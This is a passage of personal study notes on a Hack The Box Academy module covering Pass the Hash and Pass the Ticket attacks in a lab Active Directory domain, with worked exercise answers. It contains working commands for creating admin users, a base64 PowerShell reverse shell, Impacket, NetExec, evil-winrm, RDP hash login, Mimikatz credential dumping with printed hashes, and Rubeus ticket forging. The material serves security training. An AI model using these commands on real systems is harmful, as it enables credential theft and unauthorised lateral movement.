- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.

```pwoershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

We can also get a reverse shell connection in the target machine. If you are unfamiliar with reverse shells, review the [[Shells & Payloads]] module on HTB Academy.

To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address `172.16.1.5`. We will use port `8001` to wait for the connection.

To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`.

Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work).

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

The result is a reverse shell connection from the DC01 host (172.16.1.10).
### Pass the Hash with Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc. For this example, we will perform command execution on the target machine using `PsExec`.

```bash
mdn0x@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
### Pass the Hash with NetExec (Linux)

[NetExec](https://github.com/Pennyw0rth/NetExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use NetExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called "Password Spraying" and is covered in-depth in the `Active Directory Enumeration & Attacks` module. Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.

```bash
mdn0x@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.

```bash
mdn0x@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

Review the [NetExec documentation Wiki](https://www.netexec.wiki/) to learn more about the tool's extensive features.
### Pass the Hash with evil-winrm (Linux)

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.

```bash
mdn0x@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
**Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
### Pass the Hash with RDP (Linux)

We can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```pwoershell
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

```
mdn0x@htb[/htb]$ xfreerdp3  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
### UAC limits Pass the Hash for local accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).
### Next steps

In this section, we learned how to use the NTLM (RC4-HMAC) hash of a user's password to perform a Pass the Hash (PtH) attack and move laterally in a target network, but that's not the only way we can move laterally. In the next section, we will learn how to abuse the Kerberos protocol to move laterally and authenticate as different users.
### Exercise

1. Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.        

Authenticate to with user `Administrator` and password `30B3783CE2ABF1AF70F77D0660CF3453`

```bash
mdn0x@htb[/htb]$ xfreerdp3  /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

*Evil-WinRM* PS C:\> cat pth.txt
HTB{{REDACTED_FLAG}}
```

2. Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.      `DisableRestrictedAdmin`

```powershell
*Evil-WinRM* PS C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.
```

3.  Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

```bash
└─$ xfreerdp3  /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

```bash
PS C:\tools> .\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
<SNIP>
Authentication Id : 0 ; 393947 (00000000:000602db)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/17/2026 2:21:04 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
<SNIP>

mimikatz # sekurlsa::msv
<SNIP>
Authentication Id : 0 ; 393947 (00000000:000602db)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/17/2026 2:21:04 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f
<SNIP>

Authentication Id : 0 ; 393947 (00000000:000602db)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/17/2026 2:21:04 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
         [00000000]
         * GUID      :  {cabd1640-87d1-4135-bc59-e3bf6d16fb7e}
         * Time      :  11/17/2026 2:21:04 PM
         * MasterKey :  a3a289ff3e006f8be5ca5267e2461b41de2393e0d7bb8e19c00f2b3b4e91338179d4b4118c8eb7f633996c5f1fe1729e021e11ce5e309d6d1abe1432f2fc63a4
         * sha1(key) :  c6e75ab1ea1717276d90bb8733c40ec40d7a2a68
```

4. Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ nxc smb 10.129.204.23 -u david -d inlanefreight.htb -H c39f2beb3d2ec06a62cb887fb391dee0 --shares
SMB         10.129.204.23   445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:True) (SMBv1:None)
SMB         10.129.204.23   445    MS01             [+] inlanefreight.htb\david:c39f2beb3d2ec06a62cb887fb391dee0 (Pwn3d!)
SMB         10.129.204.23   445    MS01             [*] Enumerated shares
SMB         10.129.204.23   445    MS01             Share           Permissions     Remark
SMB         10.129.204.23   445    MS01             -----           -----------     ------
SMB         10.129.204.23   445    MS01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.129.204.23   445    MS01             C$              READ,WRITE      Default share
SMB         10.129.204.23   445    MS01             IPC$            READ            Remote IPC

c39f2beb3d2ec06a62cb887fb391dee0:Password2

smbclient  //10.129.204.23/ -U david

HTB{{REDACTED_FLAG}}
```

5. Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.

```bash
Authentication Id : 0 ; 389038 (00000000:0005efae)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/17/2026 2:21:04 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106
        msv :
         [00000003] Primary
         * Username : julio
         * Domain   : INLANEFREIGHT
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
         * DPAPI    : 634db497baef212b777909a4ccaaf700
           
Password1

smbclient  //10.129.204.23/C$ -U julio

HTB{{REDACTED_FLAG}}
```

6. Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

Following the exact steps:
`JuL1()_N3w_fl@g`

7. Optional: John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish.
```bash
Authentication Id : 0 ; 391612 (00000000:0005f9bc)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/17/2026 2:21:04 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108
        msv :
         [00000003] Primary
         * Username : john
         * Domain   : INLANEFREIGHT
         * NTLM     : c4b0e1b10c7ce2c4723b4e2407ef81a2
         * SHA1     : 31f8f4dfcb16205363b35055ebe92a75f0a19ce3
         * DPAPI    : 2e54e60846c83d96cf8d9523b5c0df61
```

No block for john and `RMU` group so we can use [[Evil-WinRM]]
## Pass the Ticket (PtT) from Windows

Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We'll cover several ways to perform a PtT attack from Windows and Linux. In this section, we'll focus on Windows attacks, and in the following section, we'll cover attacks from Linux.

### Kerberos protocol refresher

The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

- The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.

When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.

If the user wants to connect to an MSSQL database, it will request a `Ticket Granting Service` (`TGS`) to the `Key Distribution Center` (`KDC`), presenting its `Ticket Granting Ticket` (`TGT`). Then it will give the TGS to the MSSQL database server for authentication.

It's recommended to take a look at the [Kerberos, DNS, LDAP, MSRPC](https://academy.hackthebox.com/module/74/section/701) section in the module [Introduction to Active Directory](https://academy.hackthebox.com/module/details/74) for a high-level overview of how this protocol works.

## Pass the Ticket (PtT) attack

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:

- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

Before we perform a `Pass the Ticket (PtT)` attack, let's see some methods to get a ticket using `Mimikatz` and `Rubeus`.

### Scenario

Let's imagine we are on a pentest, and we manage to phish a user and gain access to the user's computer. We found a way to obtain administrative privileges on this computer and are working with local administrator rights. Let's explore several ways we can manage to get access tickets on this computer and how we can create new tickets.

### Harvesting Kerberos tickets from Windows

On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.

```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
```

The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.

**Note:** If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

We can also export tickets using `Rubeus` and the option `dump`. This option can be used to dump all tickets (if running as a local administrator). `Rubeus dump`, instead of giving us a file, will print the ticket encoded in Base64 format. We are adding the option `/nowrap` for easier copy-paste.

**Note:** At the time of writing, using `Mimikatz version 2.2.0 20220919`, if we run `sekurlsa::ekeys` it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in Base64 format.
#### Rubeus - Export tickets

```bash
 Rubeus.exe dump /nowrap
```

**Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the `Pass the Key` aka. `OverPass the Hash` technique.
### Pass the Key aka. OverPass the Hash

The traditional `Pass the Hash` (`PtH`) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation [Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). Also [Will Schroeder](https://twitter.com/harmj0y) adapted their project to create the [Rubeus](https://github.com/GhostPack/Rubeus) tool.

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using `Mimikatz` and `Rubeus`.

```bash
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the AES-256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.

```bash
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).

**Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."
### Pass the Ticket (PtT)
#### Rubeus PtT
Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in Base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

```bash
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
Note that now it displays `Ticket successfully imported!`.

Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.

```bash
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to Base64.

```bash
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Using Rubeus, we can perform a Pass the Ticket providing the Base64 string instead of the file name.

```bash
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
```
#### MimikatzPtT

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.

```bash
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

**Note:** Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
### Pass The Ticket with PowerShell Remoting (Windows)

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.
#### Mimikatz Remoting

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute `mimikatz.exe`, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our `cmd.exe` session, we can launch a PowerShell command prompt from the same `cmd.exe` and use the command `Enter-PSSession` to connect to the target machine.

```bash
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```
#### Rubeus Remoting

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

```bash
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

```bash
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
### Moving on

We've now covered multiple ways to perform Pass the Ticket attacks from a Windows host. The following section will cover this same lateral movement technique using a Linux attack host.
### Exercise

1. Connect to the target machine using `RDP` and the provided creds. Export all tickets present on the computer. How many users `TGT` did you collect?        `3`

[[RDP]] to with user "Administrator" and password "AnotherC0mpl3xP4$ $"

```bash
└─$ xfreerdp3 /u:Administrator /p:AnotherC0mpl3xP4$$ /v:inlanefreight.htb
```

```bash
privilege::debug
sekurlsa::tickets /export


    Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 11/20/2026 7:22:15 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : cifs ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (02) : cifs ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( inlanefreight.htb )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b4e184090890f3ed78a1547b6a761bd1b3fa7370bd832bcbeb65aa174865892c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
           * Saved to file [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi !
         [00000001]
           Start/End/MaxRenew: 11/20/2026 7:22:15 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (01) : MS01$ ; @ INLANEFREIGHT.HTB
           Target Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             ece69f0312c5704a50b518679f91a6b47d4f9173c3aaee520f51c13fa81bac5d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
           * Saved to file [0;3e7]-0-1-40a50000.kirbi !
         [00000002]
           Start/End/MaxRenew: 11/20/2026 7:22:14 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (02) : LDAP ; DC01.inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9a3f73ff859df57ab57076d41c21ae94c83bf43f73d0f5b1029e92288729c961
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
           * Saved to file [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi !
         [00000003]
           Start/End/MaxRenew: 11/20/2026 7:22:14 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT.HTB )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             fc293e95734a73be876df67f24710d14638edacb1b4d840937f2efbcb1f9a932
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
           * Saved to file [0;3e7]-0-3-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 11/20/2026 7:22:15 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (--) : @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             762d54c5fd6f0af3e6ee1f042b21465f03eedb0f738ecd71f97f3d30898c3b96
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi !
         [00000001]
           Start/End/MaxRenew: 11/20/2026 7:22:14 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT.HTB )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             0b961505d1f4e4402f42381df6c521f0a43303bfc9b99e556f7b14f037c593e8
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi !    Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 11/20/2026 7:22:15 AM ; 11/20/2026 5:22:14 PM ; 11/27/2026 7:22:14 AM
           Service Name (02) : cifs ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (02) : cifs ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Client Name  (01) : MS01$ ; @ INLANEFREIGHT.HTB ( inlanefreight.htb )
